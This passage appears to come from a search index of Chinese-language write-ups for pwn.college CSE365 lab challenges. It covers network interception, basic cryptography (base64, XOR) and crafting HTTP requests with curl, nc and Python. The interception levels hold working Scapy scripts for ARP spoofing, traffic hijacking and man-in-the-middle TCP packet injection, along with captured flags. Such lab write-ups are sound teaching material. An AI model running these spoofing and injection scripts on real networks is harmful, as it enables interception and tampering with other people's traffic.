flags=\"A\"),iface=\"eth0\") \u8fc7\u7a0b\u90fd\u5199\u5b8c\u4e86\uff0c\u53ef\u4ee5\u5199\u811a\u672c\u4e86 from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.4\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.2\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.2\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") \u597d\u5427\uff0c\u6574\u4e86\u4e00\u5927\u5806\uff0c\u7136\u540e\u53d1\u73b0\u641e\u9519\u4e86\uff0c\u6ca1\u90a3\u4e48\u590d\u6742\uff0cG\u3002\u3002\u3002 \u6b63\u786e\u89e3\u7b54\u5982\u4e0b\uff1a root@ip-10-0-0-3:~# arping 10.0.0.4 ARPING 10.0.0.4 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=0 time=17.107 usec 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=1 time=13.761 usec ^C --- 10.0.0.4 statistics --- 2 packets transmitted, 2 packets received, 0% unanswered (0 extra) rtt min/avg/max/std-dev = 0.014/0.015/0.017/0.002 ms root@ip-10-0-0-3:~# sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ce:b6:65:76:0a:83\") / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"),psrc=\"10.0.0.2\",hwdst=\"ce:b6:65:76:0a:83\",pdst=\"10.0.0.4\"),iface=\"eth0\") pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW}","title":"level13 Hijack traffic from a remote host using ARP"},{"location":"CSE365/Intercepting%20Communication/#level14-man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic","text":"\u4ece\u8bb2\u89e3\u6765\u770b\uff0c\u8fd9\u4e2a\u9898\u7684\u6838\u5fc3\u662f\u9700\u8981\u52a0\u5165\u5bf9\u8bdd\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u76d1\u542c\uff0c\u56e0\u4e3a\u5bf9\u8bdd\u4e2d\u6709\u4e00\u6b21\u6027\u5bc6\u94a5\uff0c\u4ec5\u4ec5\u76d1\u542c\u5e76\u4e0d\u7ba1\u7528\uff0c\u91cd\u70b9\u662f\u6293\u4f4f\u7a97\u53e3\u671f\u53d1\u9001\u5305\u542b\u6709FLAG\u7684\u5305\u3002 \u76f4\u63a5\u5199\u4e2a\u811a\u672c from scapy.all import * sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.3\",pdst=\"10.0.0.4\"),iface=\"eth0\") #tell 10.0.0.4\uff0cwhere 10.0.0.3 it is sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.4\",pdst=\"10.0.0.3\"),iface=\"eth0\") #tell 10.0.0.3\uff0cwhere 10.0.0.4 it is packet_data = { 'key': '', 'dst': '', 'src': '', 'ipdst': '', 'ipsrc': '', 'ipflags': '', 'sport': 0, 'dport': 31337, 'flags': '', 'seq': 0, 'ack': 0 } def CallBack(packet): if packet.haslayer('TCP'): tcp = packet['TCP'] ip = packet['IP'] ether = packet['Ethernet'] load = tcp.load if hasattr(tcp, 'load') else b'' if ip.src == '10.0.0.4' and load != b'ECHO\\n': packet_data['key'] = load if ip.src == '10.0.0.3' and load == b'COMMANDS:\\nECHO\\nFLAG\\nCOMMAND:\\n': print(\"WARNING!!\") packet_data.update({ 'ipdst': ip.src, 'ipsrc': ip.dst, 'flags': 'PA', 'ipflags': ip.flags, 'dst': ether.src, 'src': ether.dst, 'dport': tcp.sport, 'sport': tcp.dport, 'seq': tcp.ack, 'ack': tcp.seq + 29 }) raw_pkt = Raw(load='FLAG\\n') (Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt).display() sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt, iface=\"eth0\") sniff(filter=\"tcp\", prn=CallBack, iface='eth0', count=100) \u7136\u540e\u987a\u5229\u62ff\u5230flag pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW} \u53ef\u4ee5\u770b\u8fd9\u4e2a \u89c6\u9891\u8bb2\u89e3 \u788e\u788e\u5ff5\uff1a\u8fd9\u4e2a\u90e8\u5206\u5176\u5b9e\u4e0d\u592a\u96be\uff0c\u91cd\u70b9\u662f\u5b66\u4f1ascapy\u5373\u53ef\uff0c\u4f46\u662f\u8be1\u5f02\u7684\u5730\u65b9\u5728\u4e8e\u5fc5\u987b\u4f7f\u7528tmux\uff0c\u597d\u50cf\u8fd9\u6837\u624d\u80fd\u5728\u4e00\u4e2a\u7236\u7ebf\u7a0b\u4e4b\u4e0b\uff0c\u4e0d\u7136\u4f60\u5728\u53e6\u4e00\u4e2ashell\u91cc\u9762\u4f7f\u7528python\u811a\u672c\uff0c\u8fd9\u4e2ashell\u91cc\u9762\u7684tcpdump\u6293\u4e0d\u5230\u4e1c\u897f\u3002\u8fd9\u66fe\u7ecf\u56f0\u6270\u4e86\u6211\u5f88\u4e45\uff0c\u522b\u7684\u5c31\u6ca1\u5565\u4e86\u3002","title":"level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic"},{"location":"CSE365/cryptograph/","text":"level1 \u76f4\u63a5\u4f7f\u7528python\u5185\u7f6e\u7684base64\u6a21\u5757\u8fdb\u884c\u89e3\u7801\u3002 import base64 # Base64-encoded string base64_string = \"cHduLmNvbGxlZ2V7Z0dBNWR1UjdUVnJmYno5d0lweThmS1VnS1FrLmROek56TURMMlFqTXlNeld9Cg==\" # Decode the string to bytes base64_bytes = base64_string.encode('ascii') message_bytes = base64.b64decode(base64_bytes) # Decode the bytes to UTF-8 string message = message_bytes.decode('utf-8') print(message) ref Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u8f6c\u6362\u4e3a\u53ef\u6253\u5370ASCII\u5b57\u7b26\u683c\u5f0f\u7684\u65b9\u6cd5\u3002\u8be5\u7b97\u6cd5\u57fa\u4e8e64\u4e2a\u4e0d\u540c\u5b57\u7b26\u7684\u5b50\u96c6\uff0c\u7531\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u52a0\u53f7\u548c\u6b63\u659c\u6760\u7ec4\u6210\u3002 Base64\u7f16\u7801\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06\u8f93\u5165\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf6\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a6\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684Base64\u5b57\u7b26 \u5982\u679c\u5269\u4f59\u6bd4\u7279\u6570\u4e0d\u8db36\u6bd4\u7279\uff0c\u5219\u4f7f\u7528\u7b49\u53f7\uff08 = \uff09\u8865\u9f50\u3002 \u4f8b\u5982\uff0c\u5c06ASCII\u5b57\u7b26 Man \u8fdb\u884cBase64\u7f16\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a ASCII\u5b57\u7b26\uff1a M a n ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 Base64\u5b57\u7b26\uff1a S m F u \u56e0\u6b64\uff0c Man \u7684Base64\u7f16\u7801\u4e3a SmFu \u3002 Base64\u89e3\u7801\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06Base64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u636e \u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf8\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a8\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684ASCII\u5b57\u7b26 \u4f8b\u5982\uff0c\u5c06 SmFu \u8fdb\u884cBase64\u89e3\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a Base64\u5b57\u7b26\uff1a S m F u 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 ASCII\u5b57\u7b26\uff1a M a n \u56e0\u6b64\uff0c SmFu \u7684Base64\u89e3\u7801\u4e3a Man \u3002 Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5e38\u7528\u7684\u6280\u672f\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f20\u8f93\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u901a\u8fc7\u7f16\u7801\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u53ef\u4ee5\u786e\u4fdd\u5b83\u4eec\u4f20\u8f93\u65f6\u907f\u514d\u51fa\u73b0\u7279\u6b8a\u5b57\u7b26\u6216\u4e0d\u53d7\u652f\u6301\u7684\u683c\u5f0f\u3002 level2 import base64 key_str = \"xMQGl4LY1hyH7Khz155o3MedyLAedmm3H56HBvCvQHlzUkuTklt4ejKly8iRul/MH0kTNBGYpPGK3Q==\" ciphertext_str = \"tLNoueG3unDii80I4/YptLXTj+NPJz7SZc7PWajGIREGIXvQ5ygwVFb3sYbr9xuALRh5eWjV3qb31w==\" # \u89e3\u7801\u5bc6\u94a5\u548c\u5bc6\u6587 key = base64.b64decode(key_str) ciphertext = base64.b64decode(ciphertext_str) # \u5bf9\u5bc6\u6587\u4f7f\u7528\u5bc6\u94a5\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c plaintext = bytearray(len(ciphertext)) for i in range(len(ciphertext)): plaintext[i] = ciphertext[i] ^ key[i % len(key)] # \u5c06\u83b7\u5f97\u7684\u5b57\u8282\u5e8f\u5217\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 original_text = plaintext.decode('utf-8') print(original_text)","title":"level1"},{"location":"CSE365/cryptograph/#level1","text":"\u76f4\u63a5\u4f7f\u7528python\u5185\u7f6e\u7684base64\u6a21\u5757\u8fdb\u884c\u89e3\u7801\u3002 import base64 # Base64-encoded string base64_string = \"cHduLmNvbGxlZ2V7Z0dBNWR1UjdUVnJmYno5d0lweThmS1VnS1FrLmROek56TURMMlFqTXlNeld9Cg==\" # Decode the string to bytes base64_bytes = base64_string.encode('ascii') message_bytes = base64.b64decode(base64_bytes) # Decode the bytes to UTF-8 string message = message_bytes.decode('utf-8') print(message)","title":"level1"},{"location":"CSE365/cryptograph/#ref","text":"Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u8f6c\u6362\u4e3a\u53ef\u6253\u5370ASCII\u5b57\u7b26\u683c\u5f0f\u7684\u65b9\u6cd5\u3002\u8be5\u7b97\u6cd5\u57fa\u4e8e64\u4e2a\u4e0d\u540c\u5b57\u7b26\u7684\u5b50\u96c6\uff0c\u7531\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u52a0\u53f7\u548c\u6b63\u659c\u6760\u7ec4\u6210\u3002 Base64\u7f16\u7801\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06\u8f93\u5165\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf6\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a6\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684Base64\u5b57\u7b26 \u5982\u679c\u5269\u4f59\u6bd4\u7279\u6570\u4e0d\u8db36\u6bd4\u7279\uff0c\u5219\u4f7f\u7528\u7b49\u53f7\uff08 = \uff09\u8865\u9f50\u3002 \u4f8b\u5982\uff0c\u5c06ASCII\u5b57\u7b26 Man \u8fdb\u884cBase64\u7f16\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a ASCII\u5b57\u7b26\uff1a M a n ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 Base64\u5b57\u7b26\uff1a S m F u \u56e0\u6b64\uff0c Man \u7684Base64\u7f16\u7801\u4e3a SmFu \u3002 Base64\u89e3\u7801\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06Base64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u636e \u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf8\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a8\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684ASCII\u5b57\u7b26 \u4f8b\u5982\uff0c\u5c06 SmFu \u8fdb\u884cBase64\u89e3\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a Base64\u5b57\u7b26\uff1a S m F u 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 ASCII\u5b57\u7b26\uff1a M a n \u56e0\u6b64\uff0c SmFu \u7684Base64\u89e3\u7801\u4e3a Man \u3002 Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5e38\u7528\u7684\u6280\u672f\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f20\u8f93\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u901a\u8fc7\u7f16\u7801\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u53ef\u4ee5\u786e\u4fdd\u5b83\u4eec\u4f20\u8f93\u65f6\u907f\u514d\u51fa\u73b0\u7279\u6b8a\u5b57\u7b26\u6216\u4e0d\u53d7\u652f\u6301\u7684\u683c\u5f0f\u3002","title":"ref"},{"location":"CSE365/cryptograph/#level2","text":"import base64 key_str = \"xMQGl4LY1hyH7Khz155o3MedyLAedmm3H56HBvCvQHlzUkuTklt4ejKly8iRul/MH0kTNBGYpPGK3Q==\" ciphertext_str = \"tLNoueG3unDii80I4/YptLXTj+NPJz7SZc7PWajGIREGIXvQ5ygwVFb3sYbr9xuALRh5eWjV3qb31w==\" # \u89e3\u7801\u5bc6\u94a5\u548c\u5bc6\u6587 key = base64.b64decode(key_str) ciphertext = base64.b64decode(ciphertext_str) # \u5bf9\u5bc6\u6587\u4f7f\u7528\u5bc6\u94a5\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c plaintext = bytearray(len(ciphertext)) for i in range(len(ciphertext)): plaintext[i] = ciphertext[i] ^ key[i % len(key)] # \u5c06\u83b7\u5f97\u7684\u5b57\u8282\u5e8f\u5217\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 original_text = plaintext.decode('utf-8') print(original_text)","title":"level2"},{"location":"CSE365/talking-web/","text":"knoeledge \u91cd\u70b9\u662fhttp \u8bf7\u6c42\u62a5\u6587\uff0c\u8fd9\u90e8\u5206\u4e0d\u592a\u6d89\u53ca\u54cd\u5e94\u62a5\u6587 \u4e00\u4e2a http \u8bf7\u6c42\u62a5\u6587\u7531\u56db\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a \u8bf7\u6c42\u884c\uff08Request-Line\uff09 \u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09 \u56de\u8f66\u6362\u884c\uff08CRLF\uff09 \u6d88\u606f\u4f53\uff08Message Body\uff09 \u8bf7\u6c42\u884c\uff08Request-Line\uff09 \u6211\u4eec\u6765\u770b\u4e00\u5f00\u59cb\u7ed9\u7684\u793a\u4f8b\u7684\u8bf7\u6c42\u884c POST / HTTP/1.1 \u8bf7\u6c42\u884c\u5206\u4e3a\u4e86\u4e09\u4e2a\u90e8\u5206\uff1a \u8bf7\u6c42\u65b9\u6cd5\uff08Method\uff09 \u8bf7\u6c42 URI HTTP \u534f\u8bae\u7248\u672c \u4e09\u8005\u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u9694\u3002 \u8bf7\u6c42\u65b9\u6cd5 GET\uff1a\u83b7\u53d6\u8d44\u6e90 POST\uff1a\u4f20\u8f93\u5b9e\u4f53\u4e3b\u4f53 PUT\uff1a\u4f20\u8f93\u6587\u4ef6 HEAD\uff1a\u83b7\u5f97\u62a5\u6587\u9996\u90e8\uff08\u76f8\u5f53\u4e8eGET\u65b9\u6cd5\u83b7\u5f97\u7684\u8d44\u6e90\u53bb\u6389\u6b63\u6587\uff09 DELETE\uff1a\u5220\u9664\u6587\u4ef6 OPTIONS\uff1a\u8be2\u95ee\u652f\u6301\u7684\u65b9\u6cd5\uff08\u5ba2\u6237\u7aef\u95ee\u670d\u52a1\u5668\uff09 TRACE\uff1a\u8ffd\u8e2a\u8def\u5f84 OCONNECT\uff1a\u8981\u6c42\u7528\u96a7\u9053\u534f\u8bae\u8fde\u63a5\u4ee3\u7406 LINK\uff1a\u5efa\u7acb\u4e0e\u8d44\u6e90\u4e4b\u95f4\u7684\u8054\u7cfb UNLINE\uff1a\u65ad\u5f00\u8fde\u63a5\u5173\u7cfb \u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09 \u8fd9\u90e8\u5206\u7531\u6210\u5bf9\u7684\u8bf7\u6c42\u5934\u90e8\u7ec4\u6210\uff0c\u7528\u6765\u544a\u77e5\u670d\u52a1\u7aef\u8bf7\u6c42\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u8fd9\u662f\u672a\u6765\u7684\u91cd\u4e2d\u4e4b\u91cd\uff01\u52a1\u5fc5\u638c\u63e1\uff01 - Host \uff1a\u8bf7\u6c42\u7684\u8d44\u6e90\u5728\u54ea\u4e2a\u4e3b\u673a\u7684\u7aef\u53e3\u4e0a - Connection\uff1a\u8be5\u8bf7\u6c42\u652f\u6301\u957f\u8fde\u63a5\uff08heep_alive\uff09 - Content-Length\uff1a\u6b63\u6587\u5185\u5bb9\u957f\u5ea6 - Content-Type\uff1a\u6570\u636e\u7c7b\u578b - User-Agent\uff1a\u58f0\u660e\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u6d4f\u89c8\u5668\u7248\u672c\u4fe1\u606f - Accent\uff1a\u53d1\u8d77\u4e86\u8bf7\u6c42 - Referer\uff1a\u5f53\u524d\u9875\u9762\u662f\u4ece\u54ea\u4e2a\u9875\u9762\u8df3\u8f6c\u8fc7\u6765\u7684 - Accept-Encoding\uff1a\u63a5\u53d7\u7684\u7f16\u7801 - Accept-Language\uff1a\u63a5\u53d7\u7684\u8bed\u8a00\u7c7b\u578b - Cookie\uff1a\u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u5c11\u91cf\u4fe1\u606f\uff0c\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u4f1a\u8bdd\uff08session\uff09\u529f\u80fd \u6d88\u606f\u4f53\uff08Message Body\uff09 \u8fd9\u90e8\u5206\u643a\u5e26\u4e86\u672c\u6b21\u8bf7\u6c42\u9700\u8981\u53d1\u5f80\u670d\u52a1\u7aef\u7684\u4fe1\u606f\uff0c\u6709\u7684 Method \u6709\u8fd9\u90e8\u5206\uff0c\u800c\u6709\u7684 Method \u4e0d\u9700\u8981\u8fd9\u90e8\u5206\u3002 \u6bd4\u5982 get \u65b9\u6cd5\u5c31\u6ca1\u6709\u6d88\u606f\u4f53\uff0cget \u65b9\u6cd5\u4e00\u822c\u90fd\u662f\u901a\u8fc7 query \u6765\u4f20\u9012\u53c2\u6570\u3002 \u800c post \u65b9\u6cd5\u4e00\u822c\u5c31\u6709\u6d88\u606f\u4f53\u3002 \u8bf7\u6c42\u5934\u90e8\u5177\u4f53\u4fe1\u606f ref https://zhuanlan.zhihu.com/p/112060856 https://blog.csdn.net/qq_40933663/article/details/90045869 Useful cmd /challenge/run Output: hacker@talking-web-level-12:~$ /challenge/run * Serving Flask app 'run' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:80 Press CTRL+C to quit \u884c\u5427\uff0c\u8fd9\u4e00\u5927\u5806\u6311\u6218\uff0c\u5012\u662f\u8ba9\u6211\u628acurl nc\u8fd9\u4fe9\u73a9\u610f\u513f\u73a9\u513f\u719f\u4e86\u3002\u3002\u3002 level1 Send an HTTP request using curl curl http://127.0.0.1:80 level2 Send an HTTP request using nc printf \"GET / HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 ref a blog level3 Send an HTTP request using python import requests response = requests.get('http://127.0.0.1:80') print(response.content) level4 Set the host header in an HTTP request using curl curl -H 'Host: f04e757423e4172f7391a2c52dd6d52b' http://127.0.0.1:80 level5 Set the host header in an HTTP request using nc echo -e \"GET / HTTP/1.1\\r\\nHost: e87665191d938ed557e6d75bed2a59e7\\r\\n\\r\\n\" | nc 127.0.0.1 80 level6 Set the host header in an HTTP request using python import requests url = 'http://127.0.0.1:80' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text) level7 Set the path in an HTTP request using curl curl http://127.0.0.1:80/32edfeba32e2616897b6a4907182e609 level8 Set the path in an HTTP request using nc printf \"GET /a2ef4bee2f651380996e3e91ec9ae47b HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level9 Set the path in an HTTP request using python import requests url = 'http://127.0.0.1:80/563d4434a61e9b4f8aad9f89476f9d56' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text) level10 URL encode a path in an HTTP request using curl curl --request GET --url 'http://127.0.0.1/5db90f90%20c57f0931/898c7a05%207a6a6c70' level11 URL encode a path in an HTTP request using nc echo -ne \"GET /c84632a0%203d7cd667/cc68c4e5%205289cce4 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level12 URL encode a path in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) path = '/24f18995%2035ce2423/0dc75e53%20a62355c0' conn.request(\"GET\", path) response = conn.getresponse() print(response.read().decode()) level13 Specify an argument in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=d12e875e302a313b93e311080177c69e\" level14 Specify an argument in an HTTP request using nc echo -ne \"GET /?a=2469a7322bdff77e7cf50f7a397ecf1e HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level15 Specify an argument in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) params = 'a=70206814776ee99485d36f75416cc53e' conn.request(\"GET\", \"/?\" + params) response = conn.getresponse() print(response.read().decode()) or import requests url = 'http://127.0.0.1/?a=2469a7322bdff77e7cf50f7a397ecf1e' response = requests.get(url) print(response.text) level16 Specify multiple arguments in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=ecd147484bddde7d37b1911de43a8879&b=40d9af5c%20d0b5b669%266fea1792%23e808fb58\" level17 Specify multiple arguments in an HTTP request using nc echo -ne \"GET /?a=5d723fd68383a9c49eb60b0633069601&b=164073f7%207871c6b5%26b94dd88d%23977ae717 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level18 Specify multiple arguments in an HTTP request using python import requests url = 'http://127.0.0.1/?a=4ce9272291b7199073124105d91e05b8&b=56eb0b42%204ae6359b%26f16e873e%2313ac55ab' response = requests.get(url) print(response.text) level19 Include form data in an HTTP request using curl curl -X POST -d \"a=aa62a14fe954e109fd0afd6a6b81ae87&b=123\" \"http://127.0.0.1/\" level20 Include form data in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 64\\r\\n\\r\\na=0f4e8daf3fc9d8aa6a59af8b111cd9b6\" | nc 127.0.0.1 80 level21 Include form data in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': '728301dd59f5157a45b164530cd4bd9a'} response = requests.post(url, data=data) print(response.text) level22 Include form data with multiple fields in an HTTP request using curl curl -X POST -d \"a=6d2e619d8691e29c605eacecff1d17f5&b=40f3c192%204a42b9c8%26042940eb%23ce8b5cc9\" \"http://127.0.0.1/\" level23 Include form data with multiple fields in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 78\\r\\n\\r\\na=7bd29b83c57c2e3a0c9f0387fabea724&b=20c245cf%2075d26cf5%26100f8c42%23d1702767\" | nc 127.0.0.1 80 level24 Include form data with multiple fields in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': 'db865b3bfd0d2e5ffa0c112dc700ddb9','b':'d7d3ad1a edee631b&eba293d5#d6e4cf79'} response = requests.post(url, data=data) print(response.text) level25 Include json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"e1d94af35f929e364d037ca78f5dbfa0\"}' http://127.0.0.1/ level26 Include json data in an HTTP request using nc data='{\"a\": \"95a77ed287428e0fbc550158d061c07c\"}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc 127.0.0.1 80 level27 Include json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"98f37a6b119aec9d10b6a7de1934c9ca\"} json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text) level28 Include complex json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"39a0e409bba714d0ffe73ce038cb7b3a\", \"b\": {\"c\": \"930862ea\", \"d\": [\"c6a605f0\", \"c7ad7398 3fbbb9dc&458f3441#25f76ea0\"]}}' http://127.0.0.1/ level29 Include complex json data in an HTTP request using nc data='{\"a\": \"b7ae4afbfd6f78ad7ab06f1203ece1be\",\"b\":{\"c\": \"0ce40827\", \"d\": [\"fb1739d2\", \"5cde3361 